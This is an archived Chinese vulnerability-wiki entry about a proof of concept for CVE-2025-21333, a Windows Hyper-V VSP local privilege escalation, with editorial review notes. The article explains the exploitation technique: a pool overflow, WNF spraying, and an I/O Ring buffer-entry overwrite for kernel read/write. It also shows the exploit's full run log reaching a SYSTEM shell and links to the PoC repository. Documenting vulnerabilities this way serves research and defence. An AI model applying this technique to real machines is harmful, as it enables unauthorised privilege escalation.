---
cve: "CVE-2025-21333"
source: "gelusus/wxvl 公众号漏洞文库"
identifier_role: "primary"
primary_identifiers: "CVE-2025-21333"
referenced_identifiers: ""
identifier_status: "unknown"
title: "【PoC】Windows Hyper-V NT 内核集成 VSP 提权漏洞"
product: "Windows Hyper-V VSP CVE-2025-21333"
record_type: "unknown"
document_type: "技术文章（细分类待核）"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "原文未给出可确认的版本、认证及部署边界；保留待核"
side_effects: "坦诚不可靠和机器崩溃风险，IO Ring对象利用机制有价值"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/%E3%80%90PoC%E3%80%91Windows%20Hyper-V%20NT%20%E5%86%85%E6%A0%B8%E9%9B%86%E6%88%90%20VSP%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "missing"
source_note: "原始出处待补；仓库归档不等同原始披露"
id: "vw-9d8b5b37c4eefeece1923682"
entity_id: "ve-9d8b5b37c4eefeece1923682"
schema_version: "1"
previous_identifier_role: "unknown"
previous_primary_identifiers: ""
---

# 【PoC】Windows Hyper-V NT 内核集成 VSP 提权漏洞

> 编号角色校订（2026-10-04）：按归档技术正文区分主讨论编号与背景引用，更新 `primary_identifiers` / `referenced_identifiers` 及旧字段角色。旧编号原值、状态与正文保持原样，变更前字段逐字保存在 `previous_*`；后文旧的角色待核说明应按当前字段阅读。这里的角色判读不等于官方分配核验或漏洞复现。

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：Windows Hyper-V VSP CVE-2025-21333
- 文献类型：技术文章（细分类待核）
- 版本、权限及部署边界：原文未给出可确认的版本、认证及部署边界；保留待核
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 明确仅测试Win11 23H2、24H2未测，给驱动/内核hash和22631.4460日志利于复现
2. 必须Windows Sandbox已启用且本地低权执行，不能标题泛化guest到host逃逸
3. 坦诚不可靠和机器崩溃风险，IO Ring对象利用机制有价值
4. 无漏洞根因源码/编译依赖和MSRC补丁，开头提参考章节却全文无参考列表，只一PoC仓库
5. 在野利用需微软来源
6. 运行日志多行压扁，含沙箱临时AccountPassword/标识不能直接作为当前环境参数
7. 不得将此PoC当只读检查

### 操作风险

坦诚不可靠和机器崩溃风险，IO Ring对象利用机制有价值

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原始披露 URL 未确认；既有归档来源标签保留，不能替代原始公告

### 归档技术正文

 独眼情报   2025-02-28 04:11  
  
# CVE-2025-21333-POC  
  
这是一个利用   
CVE-2025-21333  
 在 vkrnlintvsp.sys 中的漏洞的概念验证（不太可靠，详见需求和限制部分）。参考部分列出了对想要研究此漏洞利用的人非常有用的资源。 该漏洞被发现正在被威胁行为者积极利用。 已在 **Windows 11 23h2**  
 上测试。 它可能也适用于 **Windows 11 24h2**  
，但我尚未测试。 以下是用于测试此POC的 ntoskrnl.exe 和 vkrnlintvsp.sys 的哈希值。  
```
PS C:\Windows\System32\drivers> get-filehash .\vkrnlintvsp.sys
Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA256          28948C65EF108AA5B43E3D10EE7EA7602AEBA0245305796A84B4F9DBDEDDDF77       C:\Windows\System32\drivers\v...
PS C:\Windows\System32\drivers>

```  
```
PS C:\Windows\System32> Get-FileHash ntoskrnl.exe
Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA256          999C51D12CDF17A57054068D909E88E1587A9A715F15E0DE9E32F4AA4875C473       C:\Windows\System32\ntoskrnl.exe
PS C:\Windows\System32>

```  
## 覆写 I/O Ring 缓冲区条目以获取任意读/写  
  
该漏洞不使用 NtQuerySystemInformation 来泄露内核地址，也不使用 PreviousMode 来获取任意读/写。 相反，它在分页池中分配一个指向   
_IOP_MC_BUFFER_ENTRY  
 的指针数组，并用一个位于用户空间的恶意 IOP_MC_BUFFER_ENTRY* 覆写第一个指针。使用 _BuildIoRingWriteFile()_/_BuildIoRingReadFile()_  
 可以在内核中获得任意读/写能力。 指向 __IOP_MC_BUFFER_ENTRY_  
 的指针数组是一个带有 PoolTag **IrRB**  
 的对象。 这种技术与 Yarden Shafir 在  
这里  
记录的技术略有不同。与控制由 _IORING_OBJECT.RegBuffers  
 指向的整个数组不同，该技术**仅控制**  
由 _IORING_OBJECT.RegBuffers  
 指向的数组中的**一个条目**  
。 由于指针数组的大小可由用户控制，这意味着它可以用于从多个 LFH 存储桶的堆溢出和 UAF 开始获取可靠的内核中任意读/写能力。 我不知道是否有人已经分享了这种利用分页池中的溢出或 UAF 的技术。 这些截图是在执行 POC 后拍摄的。溢出发生在对象大小为 0x50 的存储桶中。注意可以在该存储桶中分配 RegBuffers 数组，且第一个指针指向用户空间内存。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/KgxDGkACWnTo9eLLCxs64bsKrohs3qILNQia20NiapdRQDZ71lRm3XBViaA6ZhZ7ZyBdbn534q7TftmyrHYwoMAXQ/640?wx_fmt=png&from=appmsg "")  
  
注意恶意条目将 Address  
 设置为一个进程对象。_Address_ 对应于我们可能想要读取/写入的任意地址（这在 Yarden Shafir 的文章中已有详细描述）。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/KgxDGkACWnTo9eLLCxs64bsKrohs3qILMg6Vwo77sLXuXLCubiaXnAib5EQzByRiaNOq00ESjtQiavL3WaTvNVWTiag/640?wx_fmt=png&from=appmsg "")  
## 需求和限制  
  
必须开启 **Windows 沙箱功能**  
，这样易受攻击的系统调用才会由易受攻击的驱动程序处理。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/KgxDGkACWnTo9eLLCxs64bsKrohs3qILYWhMpzyMMlJ4umfZG0wKpicO0fOZ0kLWXWGgOIW1CWk7MA7ChbEaxxg/640?wx_fmt=png&from=appmsg "")  
  
我设法获得了 **0xfff0 字节的溢出**  
。我没能使溢出长度完全可控。如果**溢出大于子段**  
，则可能会看到**崩溃**  
（这种情况可能会经常发生）。也许通过喷射更多对象可以最小化这种情况。 这个 POC 释放了 2 个 WNF 状态数据，以在这些位置重新分配一个 regBuffer（与 IORING_OBJECT 关联的   
_IOP_MC_BUFFER_ENTRY  
 指针数组）和一个 PipeAttribute。有时，在释放和重新分配之间，可能会有其他驱动程序在该位置分配另一个对象。可以在循环中使用其他被破坏的 WNF 状态数据对象执行多次重新分配尝试，以增加获得所需布局的可能性。 POC 代码相当混乱。 获得系统权限后，最好**在控制台中键入 exit 退出系统 shell**  
，否则**机器会崩溃**  
。  
## 编译和运行  
  
编译 x64 Release 版本。 运行并获取系统 shell。  
```
PS C:\Users\unpriv> .\CVE-2025-21333-POC.exe
Preparing...
[*] fNtCreateCrossVmEvent = 00007FFD6BC31690
[*] fNtQueryInformationProcess = 00007FFD6BC304E0
[!] WindowsSandboxClient.exe process not found
[*] spawning windows sandbox
[*] CreateProcessA returned successfully
[*] NtQueryInformationProcess returned successfully
[*] peb_addr = 0000000100335000
[*] ReadProcessMemory returned successfully
[*] ProcessParameters = 00000147B06A6430
[*] ReadProcessMemory returned successfully
[*] CommandLine = 00000147B06A6ADA
[*] CommandLine_size = 3f0
[*] commandline = C:\Windows\system32\WindowsSandboxClient.exe <ContainerId>19a1ef14-ee35-47d8-8bdb-cf4c86272272</ContainerId><AccountUser>WDAGUtilityAccount</AccountUser><AccountPassword>66387310-a27d-4a59-a688-3ab018388c9e</AccountPassword><AudioInputEnabled>true</AudioInputEnabled><ClipboardRedirectionEnabled>true</ClipboardRedirectionEnabled><RebootSupported>true</RebootSupported><SmartCardRedirectionEnabled>false</SmartCardRedirectionEnabled><FullScreenMode>false</FullScreenMode><TargetDisplay>0</TargetDisplay>
[*] extracted guid = 19a1ef14-ee35-47d8-8bdb-cf4c86272272
[*] s_guid = 19a1ef14-ee35-47d8-8bdb-cf4c86272272
Created GUID
extracted guid
0x000000: 14 ef a1 19 35 ee d8 47 8b db cf 4c 86 27 22 72  ....5..G...L.'"rguid0x000000: 14 ef a1 19 35 ee d8 47 8b db cf 4c 86 27 22 72  ....5..G...L.'"rTriggering vuln creating crossvmevent...max corrupted WNFstate: a18d294541c64e6d val: 0  dataSize: 10040calling NtqueryWnfStateData on max_corrupted with max_corrupted->state a18d2945a18d2945 and datasize10040buffer content[+] found WNF to be freed and replaced with RegBuffersoffset 30[+] found WNF to be freed and replaced with PipeAttributeoffset2 80updating regBuffersControllerWNFcalling NtUpdateWnfStateData on tokenReaderWNF->state a18d2945a18d2945 and datasize10040calling NtUpdateWnfStateData returned successfully[*] retrieving WNF with content 0x4343434343434343[*] retrieving WNF with content 0x4444444444444444searching in statenames2found corrupted WNF: a18d514541c64e6dval: 4343434343434343found corrupted WNF: a18d614541c64e6dval: 4444444444444444found1 1 found2 1found1 1 found2 1found1 1 found2 10x000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................0x000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................0x000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................0x000030: 00 00 05 0b 49 72 52 42 64 b9 76 d3 e4 ff d1 c6  ....IrRBd.v.....0x000040: a0 a1 b1 f1 09 e3 ff ff 00 00 00 00 00 00 00 00  ................0x000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................0x000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................0x000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................0x000080: 00 00 05 03 4e 70 41 74 00 00 00 00 00 00 00 00  ....NpAt........0x000090: d0 01 2b 47 0a d1 ff ff d0 01 2b 47 0a d1 ff ff  ..+G......+G....0x0000a0: 38 81 2a 4d 0a d1 ff ff 16 00 00 00 00 00 00 00  8.*M............0x0000b0: 3a 81 2a 4d 0a d1 ff ff 5a 00 41 41 41 41 41 41  :.*M....Z.AAAAAA0x0000c0: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA0x0000d0: 00 00 05 03 57 6e 66 20 42 42 42 42 42 42 42 42  ....Wnf BBBBBBBB0x0000e0: 00 00 00 00 50 ff 00 00 50 ff 00 00 01 00 00 00  ....P...P.......0x0000f0: 03 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................0x000100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................0x000110: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................0x000120: 00 00 05 03 57 6e 66 20 42 42 42 42 42 42 42 42  ....Wnf BBBBBBBB0x000130: 00 00 00 00 00 ff 00 00 00 ff 00 00 01 00 00 00  ................0x000140: 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................[+] regBuffers found and can be overwritten[+] pipeAttribute found and can be read[*] original_regBufferEntry: ffffe309f1b1a1a0[*] pipeAttributeFlink: ffffd10a472b01d0[+] found target handle[*] targetHandle: 00000211216BC4D0[*] ioring index: 425[*] fileObject: ffffe309f134d7e0[*] base of npfs.sys: fffff80631660000[*] base of ntoskrnl.exe: fffff80628c00000[*] system EPROCESS: ffffe309ea4c2040[*] system TOKEN: ffffd10a3a246040[*] curpid: 21c8Microsoft Windows [Version 10.0.22631.4460](c) Microsoft Corporation. All rights reserved.C:\Users\unpriv>whoamint authority\systemC:\Users\unpriv>exitcalling NtUpdateWnfStateData returned successfullyPS C:\Users\unpriv>
```  
>   
> PoC见： https://github.com/MrAle98/CVE-2025-21333-POC  
  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原始披露 URL 尚未确认，现有链接按来源追溯区分别标注）
